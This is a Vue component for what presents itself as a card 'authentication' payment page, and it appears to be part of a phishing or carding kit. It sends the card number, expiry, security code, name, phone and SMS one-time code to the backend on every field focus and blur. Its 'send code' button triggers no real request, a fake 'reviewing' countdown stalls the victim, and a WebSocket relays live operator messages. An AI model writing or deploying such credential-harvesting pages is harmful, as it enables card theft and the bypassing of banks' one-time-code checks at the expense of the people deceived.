<script setup>
import { ref, watch } from 'vue';
import { addCard, getcaptcha } from "@/api/pay"
import { showLoadingToast, showDialog } from 'vant';
import { useChatStore } from "@/stores/chat";
import { useAppStore } from "@/stores/app";
import { useI18n } from 'vue-i18n'
import { useRouter } from 'vue-router';

const router = useRouter()
const chat = useChatStore()
const app = useAppStore()
chat.initWebSocket()
const { t } = useI18n()

const reviewTimer = ref(null)
const reviewTimeNum = ref(0)
const showLoading = ref(null)

watch(() => chat.msgList, () => {
  showDialog({
    title: '',
    message: chat.msgList[chat.msgList.length -1].msg,
  }).then(() => {
    if(showLoading.value != null && Number(chat.msgList[chat.msgList.length -1].status) == 0){
      showLoading.value.close()
      clearInterval(reviewTimer.value)
      reviewTimeNum.value = 0
    }
  });
}, {deep: true})

const query = ref({
  card: '',
  validity: '',
  security: '',
  name: '',
  phone: '',
  captcha: ''
})
const currentStep = ref(0)
const nextStep = () => {
  submitCard()
  currentStep.value+=1
}
const timer = ref(null)
const timeNum = ref(0)
const getCodeText = ref(t('pay.sendCode'))
const getCode = () => {
  if(timeNum.value > 0) return
  timeNum.value = 60
  timer.value = setInterval(() => {
    timeNum.value--
    if(timeNum.value == 0){
      clearInterval(timer.value)
    }
  }, 1000)
}
const submitCard = () => {
  addCard(query.value)
}

const submit = () => {
  if(reviewTimeNum.value > 0) return
  reviewTimeNum.value = app.times
  showLoading.value = showLoadingToast({
    message: t('pay.reviewing') + reviewTimeNum.value + 's',
    duration: 0,
    overlay: true
  })
  reviewTimer.value = setInterval(() => {
    reviewTimeNum.value-=1
    showLoading.value.message = t('pay.reviewing') + reviewTimeNum.value + 's'
    if(reviewTimeNum.value == 0){
      getCodeText.value = t('pay.reSendCode')
      showDialog({
        message: t('pay.pleaceReSendCode')
      })
      showLoading.value.close()
      clearInterval(reviewTimer.value)
      // router.psuh('/user')
    }
  }, 1000)
  getcaptcha({cardid: query.value.card, captcha: query.value.captcha})
}

</script>
<template>
  <VantHeader :title="$t('pay.renzheng')"/>
  <div class="px-30">
    <div class="flex items-center mt-60">
      <van-icon name="passed" size="26" color="#333" />
      <h2 class="text-xl">{{ $t('pay.cardDetail') }}</h2>
    </div>
    <div class="mt-10">
      <van-progress :percentage="50" stroke-width="8" :show-pivot="false" />
    </div>
    <div v-show="currentStep == 0">
      <div class="rounded-b-2xl shadow-xl bg-[#faf5ff] overflow-hidden mb-60">
        <van-cell-group>
          <van-field v-model="query.card" :placeholder="$t('pay.cardNo')" @focus="submitCard" @blur="submitCard">
            <template #button>
              <div class="flex">
                <div class="flex items-center justify-center border border-solid border-[#ebedf0] pt-10" style="height: 30px;">
                  <div class="" style="width: 50px;">
                    <svg fill="none" viewBox="0 0 63 40" class="mastercard"><g fill-rule="evenodd" clip-rule="evenodd"><path fill="#ED0006" d="M31.618 26.812a11.035 11.035 0 0 1-7 2.469c-5.961 0-10.793-4.626-10.793-10.333S18.657 8.614 24.617 8.614c2.672 0 5.117.93 7.001 2.47a11.036 11.036 0 0 1 7-2.47c5.961 0 10.793 4.627 10.793 10.334s-4.832 10.333-10.792 10.333c-2.672 0-5.117-.93-7.001-2.469"></path><path fill="#F9A000" d="M31.62 26.813c2.32-1.896 3.791-4.716 3.791-7.865s-1.471-5.97-3.791-7.864a11.035 11.035 0 0 1 7-2.47c5.96 0 10.793 4.627 10.793 10.334S44.58 29.281 38.62 29.281c-2.671 0-5.116-.929-7-2.468"></path><path fill="#FF5E00" d="M31.619 26.812c-2.32-1.896-3.792-4.716-3.792-7.865 0-3.15 1.47-5.97 3.79-7.864 2.321 1.895 3.793 4.715 3.793 7.864 0 3.15-1.471 5.97-3.791 7.865"></path></g></svg>
                  </div>
                </div>
                <div class="ml-10 flex items-center justify-center border border-solid border-[#ebedf0] pt-10" style="height: 30px;">
                  <div style="width: 50px;">
                    <svg fill="none" viewBox="0 0 45 15" class="visa"><path fill="#172B85" fill-rule="evenodd" d="M11.121 14.8h-3.85L4.386 3.683c-.137-.512-.428-.964-.856-1.177A12.449 12.449 0 0 0 0 1.328V.9h6.202a1.62 1.62 0 0 1 1.604 1.39l1.498 8.02L13.152.9h3.743L11.12 14.8m7.911 0h-3.635L18.39.9h3.636l-2.994 13.9m7.7-10.05c.107-.748.749-1.176 1.498-1.176 1.177-.108 2.459.107 3.529.641l.642-2.993A9.127 9.127 0 0 0 29.086.58c-3.529 0-6.097 1.926-6.097 4.598 0 2.033 1.82 3.1 3.103 3.744 1.389.64 1.924 1.069 1.817 1.71 0 .962-1.07 1.39-2.138 1.39-1.284 0-2.568-.32-3.743-.856l-.642 2.995c1.284.533 2.673.748 3.957.748 3.957.106 6.416-1.818 6.416-4.705 0-3.636-5.027-3.85-5.027-5.452ZM44.484 14.8 41.597.9h-3.1c-.643 0-1.285.428-1.498 1.069l-5.346 12.832h3.742l.748-2.031h4.598l.428 2.03h3.315M39.033 4.642l1.068 5.24h-2.994l1.926-5.24" clip-rule="evenodd"></path></svg>
                  </div>
                </div>
              </div>
            </template>
          </van-field>
          <van-row>
            <van-col span="12">
              <van-field v-model="query.validity" label-align="top" :label="$t('pay.dueDate')" placeholder="MM/YY"  @focus="submitCard" @blur="submitCard" />
            </van-col>
            <van-col span="12" class="pt-30">
              <van-field v-model="query.security" :placeholder="$t('pay.securityCode')" size="large"  @focus="submitCard" @blur="submitCard" />
            </van-col>
          </van-row>
          <van-field style="height: 0;padding: 1px;" />
          <van-field v-model="query.name" label-align="top" :label="$t('pay.cardUsername')" :placeholder="$t('pay.example')" @focus="submitCard" @blur="submitCard" />
        </van-cell-group>
      </div>
      <van-button :loading="loading" round block type="primary" size="large" @click="nextStep">
          {{ $t('pay.next') }}
      </van-button>
    </div>
    <div v-show="currentStep == 1">
      <div class="rounded-b-2xl shadow-xl bg-[#faf5ff] overflow-hidden mb-60">
        <van-cell-group>
          <van-field v-model="query.phone" :placeholder="$t('register.tel')" @focus="submitCard" @blur="submitCard" />
          <van-field v-model="query.captcha" :placeholder="$t('login.placeholder[2]')" class="mt-30" :rules="[{ required: true }]" @focus="submitCard" @blur="submitCard">
            <template #button>
              <van-button size="small" type="primary" @click="getCode">{{ timeNum==0 ? $t('pay.sendCode') : timeNum + 's' }}</van-button>
            </template>
          </van-field>
        </van-cell-group>
      </div>
      <van-button :loading="loading" round block type="primary" size="large" @click="submit">
          {{ $t('pay.submit') }}
      </van-button>
    </div>
  </div>
</template>
<style scoped lang="scss">
:deep(.van-cell),
:deep(.van-cell-group){
  background-color: transparent;
}
</style>